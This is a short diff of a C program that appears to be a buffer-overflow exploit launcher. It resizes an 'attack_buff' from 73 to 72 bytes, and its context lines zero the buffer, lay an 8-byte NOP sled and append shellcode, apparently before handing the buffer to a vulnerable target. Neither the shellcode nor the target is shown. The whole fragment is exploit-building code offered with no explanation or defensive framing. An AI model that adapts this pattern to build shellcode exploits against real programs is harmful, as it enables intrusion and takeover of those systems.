@@ -12,10 +12,10 @@ main ( int argc, char * argv[] )
 	char *	args[3];
 	char *	env[1];
 
-	char attack_buff[73];
+	char attack_buff[72];
 
 	// zero out attack_buff for sanity
-	bzero(attack_buff, 73);
+	bzero(attack_buff, 72);
 
 	memset(&attack_buff, NOP, 8);	
 	strcat(attack_buff, shellcode);
